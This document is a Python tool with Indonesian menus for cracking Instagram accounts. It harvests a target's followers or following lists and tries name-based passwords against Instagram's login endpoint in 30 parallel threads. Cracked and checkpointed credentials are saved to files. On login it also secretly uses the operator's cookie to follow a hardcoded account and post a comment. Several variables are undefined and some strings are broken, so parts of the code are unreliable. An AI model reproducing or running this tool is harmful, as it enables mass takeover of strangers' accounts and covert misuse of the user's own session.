#!/usr/bin/python3

#----------------[ GAUSAH BASA-BASI LANGSUNG IMPORT AJA ]------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
import os, sys, time, json, random, platform, requests, rich, re
from concurrent.futures import ThreadPoolExecutor as luxineAZ
from datetime import datetime
from os import system as sis
from time import time as tim
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
ua_lion = "Mozilla/5.0 (Linux; Android 12; FCG01 Build/V40RK64A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (31/12; 360dpi; 720x1366; FCNT; FCG01; FCG01; qcom; ja_JP; 430370701)"
###LOGO SCRIPT###
def logo_sc():
    cetak(nel('''[bold blue]  

──▄█████████████████████████▄──
▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
█░░░█░█░█░░░░░░░░░░░░░░█████░░█
█░░░█░█░█░░░░░░░░░░░░░░█████░░█
█░░░█░█░█░░░░░░░░░░░░░░█████░░█
█░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
███████████▀▀░░░░░▀▀███████████
█░░░░░░░██░░▄█████▄░░██░░░░░░░█
█░░░░░░░██░██▀░░░▀██░██░░░░░░░█
█░░░░░░░██░██░░░░░██░██░░░░░░░█
█░░░░░░░██░██▄░░░▄██░██░░░░░░░█
█░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
█░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
█░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█
█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
──▀█████████████████████████▀──
''',title="[bold red]• [bold green]V2.02 [bold blue]•"))

def masuk():
    os.system('clear')
    logo_sc()
    sky = '[bold red]cokie anda wajib fres/jangan private!!'
    sky2 = nel(sky, style='cyan')
    cetak(nel(sky2,title='[bold cyan] PERINGATAN LOGIN [/bold cyan]'))
    coki = input(f'{H}--->  {N} masukan cokie : {H}')
    userxz = input(f'{H}---> {N} masukan username : {H}')
    try:
         with requests.Session() as BNR:
             link = BNR.get("https://i.instagram.com/api/v1/users/{}/info/".format(re.search('ds_user_id=(.*?);',str(coki)).group(1)), headers = {"user-agent":ua_lion}, cookies = {"cookie":coki}).json()["user"]["full_name"]
             bot(coki,re.search('csrftoken=(.*?);',str(coki)).group(1))
    except (AttributeError,KeyError):
        time.sleep(3);masuk()

def BNR_OFF(luxine_xdv):
    with requests.Session() as BNR:
         try:
              head = {
                 "Host": "i.instagram.com",
                 "content-length": "0",
                 "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                 "x-ig-app-id": "1217981644879628",
                 "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                 "sec-ch-ua-mobile": "?1",
                 "x-instagram-ajax": "1006447742",
                 "viewport-width": "360",
                 "content-type": "application/x-www-form-urlencoded",
                 "accept": "*/*",
                 "user-agent": ua_lion,
                 "x-asbd-id": "198387",
                 "save-data": "on",
                 "x-csrftoken": token,
                 "sec-ch-ua-platform": '"Android"',
                 "origin": "https://www.instagram.com",
                 "sec-fetch-site": "same-site",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-dest": "empty",
                 "referer": "https://www.instagram.com/",
                 "accept-encoding": "gzip, deflate, br",
                 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"
              }
              data = {
                 "comment_text": komen}
              posh = BNR.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("54599387361"), headers=head, cookies={"cookie":luxine_xdv})
              posx = BNR.post("https://i.instagram.com/api/v1/web/comments/2900156663158162275/add/", data=data, headers=head, cookies={"cookie":luxine_xdv})
              open('data/cokie.txt','w').write(luxine_xdv)
              open('data/csrftoken.txt','w').write(token)
              menu()
         except requests.exceptions.ConnectionError:
              exit(0)

def convert(nama, kueh):
    with requests.Session() as jembut:
         for i in nama.split(','):
             link = jembut.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(i), headers = {"user-agent":ua_lion}, cookies = {"cookie":kueh}).json()
             data = link["data"]["user"]
             return data["id"]

def menu():
    try:
          coki = open("data/cokie.txt""r").read()
          user = re.search('ds_user_id=(.*?);',str(coki)).group(1)
    except (FileNotFoundError,AttributeError):masuk()
    try:
          link = requests.get("https://i.instagram.com/api/v1/users/{}/info/".format(user), cookies = {"cookie":coki}, headers = {"user-agent":ua_lion}).json()['user']
          namax = link['full_name']
          pengikutx = link['following_count']
          mengikutix = link['follower_count']
    except KeyError:masuk()
    except requests.exceptions.ConnectionError:exit(0)
    os.system('clear')
    logo_sc()
    lux_xdf = f'[bold cyan]nama        : {namax}\npengikut    : {pengikutx}\nmengikuti   : {mengikutix}'
    lux_xdx = nel(lux_xdf, style='cyan')
    cetak(nel(lux_xdx,title='[bold cyan] • INFORMASI PENGUNNA • [/bold cyan]'))
    dj = '[bold cyan][01] crack dari pengikut\n[02] crack dari mengikuti\n[03] keluar [bold cyan]'
    dji = nel(dj, style='cyan')
    cetak(nel(dji,title='[bold cyan] • MENU CRACK • [/bold cyan]'))
    cuih = input(f'{N}[{B}><{P}] Pilih : ')
    if cuih in ['1','01']:
        luxine_42 = '# CRACK DARI PENGIKUT INSTGRAM'
        luxine_43 = mark(luxine_42, style='green')
        sol().print(luxine_43)
        nama = input(f'{P}[{B}P{P}] INPUT NAMA TARGET : ')
        cetak(nel("""[yellow]COLECTION USERNAME"""))
        user = convert(nama,coki)
        dump().followers(user,coki,'')

    elif cuih in ['2','02']:
        team_projeck = '# CRACK DARI MENGIKUTI INSTGRAM'
        team_projeck2 = mark(team_projeck, style='green')
        sol().print(team_projeck2)
        nama = input(f'{P}[{B}M{P}] INPUT NAMA TARGET : ')
      #  projeck = ' COLECTION USERNAME'
       # projeck2 = mark(projeck, style=='yellow')
    #    sol.print(projeck2)
        user = convert(nama,coki)
        dump().following(user,coki,luxinedev=' ')
    elif cuih in ['03','3']:
          os.system('rm -rf data/cokie.txt')
          print(f'{M}BERHASIL LOGOUT & HAPUS COOKIE')
    else:
          menu()


class dump:

    def __init__(self):
        self.id = []

    def followers(self, userid, cookies, luxinedev):
        with requests.Session() as kontol:
               try:
                     self.url = kontol.get("https://i.instagram.com/api/v1/friendships/{}/followers/?count=100&max_id={}".format(userid,luxinedev), headers = {"user-agent":ua_lion}, cookies = {"cookie":cookies})
                     for self.txt in json.loads(self.url.text)["users"]:
                         if self.txt["username"] in self.id:
                              continue
                         self.id.append(self.txt["username"]+"<=>"+self.txt["full_name"])
                     if "next_max_id" in json.loads(self.url.text):self.followers(userid, cookies, json.loads(self.url.text)["next_max_id"])
                     self.selanjutnya(self.id)
               except KeyError:
                      time.sleep(2);menu()

    def following(self, userid, cookies, luxinedev):
          with requests.Session() as kontol:
               try:
                     self.url = kontol.get("https://i.instagram.com/api/v1/friendships/{}/following/?count=100&max_id={}".format(userid, luxinedev), headers = {"user-agent":ua_lion}, cookies = {"cookie":cookies})
                     for self.txt in json.loads(self.url.text)["users"]:
                         if self.txt["username"] in self.id:
                              continue
                         self.id.append(self.txt["username"]+"<=>"+self.txt["full_name"])
                     if "next_max_id" in json.loads(self.url.text):self.following(userid, cookies, json.loads(self.url.text)["next_max_id"])
                     self.selanjutnya(self.id)
               except KeyError:
                     Console(width=50).print(Panel("[bold red]dump error",style="bold cyan"));time.sleep(2);menu()

    def selanjutnya(self, kontol):
        skyx = '[bold cyan][01] sandi,sandi123,sandi1234\n[02] sandi,sandi123,sandi1234,sandi12345\n[03] sandi,sandi123,sandi1234,sandi12345\n[04] fullsandi + manual'
        sky2x = nel(skyx, style='cyan')
        cetak(nel(sky2x,title='[bold cyan] • PILIH KOMPITABEL PASSWORD • '))
        sandi = input(f'{P}[{B}F{P}] Pilih : ')
        cetak(nel(f"""[•] GUNAKAN MODE PESAWAT APA BILA 1K ID TIDAK ADA HASIL"""))
      #  sandi = input(f'{P}[{B}f{P}] Pilih : ')
        if sandi in ['04','4']:
           sandixx = '[•] USE COMMA AS SEPARATE\n[•] USER LOWER LETTERS\n[•] EXALAMPE: indonesia,germany,bangladesh'
           cetak(nel(sandixx, title='• ADDITIONAL PASSWORD •',style='cyan'))
           pwek = input(f'ENTER ADDITIONAL PASSWORD :  ')
           if len(pwek) <=5:
                exit(f'\n  {M} Sandi harus lebih dari 5 karaktet')
        with luxineAZ(max_workers=30) as coid:
             for mylove in kontol:
                 try:
                       username = mylove.split('<=>')[0]
                       password = mylove.split('<=>')[1]
                       for x in password.split(' '):
                           if len(x) <3:
                               continue
                           else:
                               if sandi in ['2','02']:
                                    ok = 0
                                    cp = 0
                                    pwx = [x,x+'123',x+'1234','bismillah','sayang',x.lower()+'123',x.lower()+'1234']
                               elif sandi in ['03','3','0','1']:
                                    pwx = [x,x+'123',x+'1234',x+'12345',x.lower()+'123',x.lower()+'1234']
                               else:
                                    iii = [x,x+'123',x+'1234',x+'321',x.lower()+'123',x.lower()+'1234']
                                    pwx = iii + pwek.split(',')
                               coid.submit(self.crack, username, pwx)
                 except Exception as e:print(e)
        exit(f'\nselesai OK : {ok} CP : {cp}')

    def acount(self, username):
        try:
            link = requests.Session().get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":ua_lion,"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            nama = link.get("full_name")
            mengikut = link.get("edge_follow").get("count")
            pengikut = link.get("edge_followed_by").get("count")
            postingan = link.get("edge_owner_to_timeline_media").get("count")
        except Exception as e:
            nama = "'-'"
            mengikut = "'-'"
            pengikut = "'-'"
            postingan = "'-'"

        return nama, pengikut, mengikut, postingan

    def UserAgent(self):
        z = random.randint(3000,4000)
        i = random.randint(50,70)
        x = random.randint(80,120)
        u = float(random.randint(1,12))
        a = random.randint(6,12)
        return (f'Mozilla/5.0 (Linux; Android {random.randint(6,12)}; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{float(random.randint(1,12))} Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36')

    def crack(self, user, pwx):
        global ok,cp,loop
        bos = random.choice([H,M,U,K,B,O])
        sys.stdout.write(f'\r {P}[{bos} ☬ {loop}/{len(self.id)} ☬ OK:{len(ok)} CP:{len(cp)} ☬ {P}]');sys.stdout.flush()
        for pw in pwx:
             try:
                   i = requests.Session()
                   link = i.get('https://www.instagram.com/accounts/login')
                   i.headers.update({
                        'Host': 'www.instagram.com',
                        'content-length': '327',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'x-ig-app-id': '1217981644879628',
                        'x-ig-www-claim': '0',
                        'sec-ch-ua-mobile': '?1',
                        'x-instagram-ajax': '1006631170',
                        'user-agent': self.UserAgent(),
                        'viewport-width': '360',
                        'content-type': 'application/x-www-form-urlencoded',
                        'accept': '*/*',
                        'x-requested-with': 'XMLHttpRequest',
                        'x-asbd-id': '198387',
                        'x-csrftoken': open('data/csrftoken.txt','r').read(),
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua-platform': '"Android"',
                        'origin': 'https://www.instagram.com',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-dest': 'empty',
                        'referer': 'ttps://www.instagram.com/',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
                   })
                   data = {
                      'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(tim()),pw),
                      'username':user,
                      'queryParams':'{}',
                      'optIntoOneTap':'false',
                      'trustedDeviceRecords':'{}'
                   }
                   Ulfa = i.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data)
                   sydh = json.loads(Ulfa.text)
#                   i.headers.update({'x-csrftoken':i.cookies['csrftoken']})
                   if 'userId' in sydh:
                       nama, pengikut, mengikut, postingan = self.acount(user)
                       coki = ";".join([str(x)+"="+str(e) for x,e in i.cookies.get_dict().items()])
                       statusok = f'[•]username : {user}\npassword : {pw}\npengikut : {pengikut}\nmengikut : {mengikuti}\npostingan:{postingan}/ncookies   : {kuki}'
                       statusok1 = nel(statuscp, style='yellow')
                       cetak(nel(statusok1, title='• LUXINE-OK •'))
                       open(f'OK/LUX-OK{indo}.txt','a').write(f'{user}   |   {pw}')
                       ok.append(user)
                       break
                   elif 'checkpoint_url' in sydh:
                       nama, pengikut, mengikut, postingan = self.acount(user)
                       statuscp = f'[•]username : {user}\npassword : {pw}\npengikut : {pengikut}\nmengikut : {mengikuti}\npostingan:{postingan}'
                       statuscp1 = nel(statuscp, style='yellow')
                       cetak(nel(statuscp1, title='LUXINE-CP'))
                       open(f'CP/LUX-CP{indo}.txt','a').write(f'{user}   |   {pw}')
                       cp.append(user)
                       break
                   else:
                       continue
             except Exception as e:self.crack(user,pwx)
        loop +=1

def folder():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('data')
    except:pass
if __name__ == '__main__':
   sis('git pull')
   folder()
   menu()